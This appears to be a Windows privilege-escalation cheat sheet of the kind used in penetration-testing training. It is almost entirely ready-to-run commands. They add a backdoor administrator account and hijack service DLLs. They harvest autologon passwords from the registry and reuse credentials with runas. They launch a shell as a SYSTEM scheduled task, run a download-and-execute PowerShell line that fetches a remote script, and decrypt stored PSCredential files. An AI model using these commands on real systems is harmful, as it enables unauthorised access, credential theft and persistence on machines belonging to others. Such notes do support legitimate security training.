# windows-privilege-escalation

## background shell

```bash
START /B FILE
```

## Create User

```bash
# add new user
net user kashz iamkashz@123 /add && net localgroup administrators kashz /add
```

## DLL hijacking

**NOTE:** needs RDP-access

```bash
# required library files which could be missing; specified with relative paths; absolute paths which could be writable.
> Run Procmon64.exe; filter to service in question; deselect registry activity and network activity
> net start <service>
# see which DLL files are missing and exploit
```

## RunAs | Creds reuse using PS

```bash
# runAs
> C:\Windows\System32\runas.exe /savecred /user:DOMAIN\USER "COMMAND"
> C:\Windows\System32\runas.exe /env /noprofile /user:USER PASSWORD "COMMAND"

# using PS
PS> (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
PS> (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword

# once we have the autologon pass
# run shell using saved cred
PS> $username = "kashz"
PS> $password = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
PS> $creds = New-Object System.Management.Automation.PSCredential($username, $password)

# run shell as scheduled task
PS> Invoke-Command -Computer HOSTNAME -ScriptBlock { schtasks /create /sc onstart /tn kshell /tr "C:\Users\Public\kashz.exe" /ru SYSTEM } -Credential $creds
PS> Invoke-Command -Computer HOSTNAME -ScriptBlock { schtasks /run /tn kshell } -Credential $creds

# run shell
PS> Start-Process "C:\Users\Public\kashz.exe" -Credential $creds
PS> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('/shell.ps1')" -Credential $creds
```

## Decrypt PSCredential

```bash
# need to be the user who encrypted the data
PS> $UserCred = Import-Clixml -Path <ENCRYPTED-DATA.txt>
| ERROR: Error occurred during a cryptographic operation. => not the right user.
PS>  $UserCred.GetNetworkCredential().password

PS> $user = "USER"
PS> $pass = "ENCRYPTED-DATA" | convertto-securestring
PS> $cred = New-Object System.Management.Automation.PSCredential($user, $pass)
PS> $cred.GetNetworkCredential() | fl
```

{% embed url="https://www.travisgan.com/2015/06/powershell-password-encryption.html" %}
